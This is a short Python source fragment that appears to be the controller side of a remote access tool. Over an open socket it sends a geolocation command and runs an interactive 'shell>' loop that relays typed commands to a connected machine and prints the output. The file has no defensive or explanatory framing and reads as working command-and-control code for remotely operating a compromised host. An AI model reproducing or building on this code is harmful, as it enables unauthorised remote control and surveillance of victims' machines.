import socket


def get_geolocation(cmd: str, conn: socket.socket) -> None:
    conn.send(cmd.encode())
    result = conn.recv(20480).decode()
    print(result)


def shell(cmd: str, conn: socket.socket) -> None:
    conn.send(cmd.encode())

    while True:
        cmd = str(input('shell> '))
        conn.send(cmd.encode())
        if cmd == 'exit':
            break
        result = conn.recv(20480).decode()
        print(result)
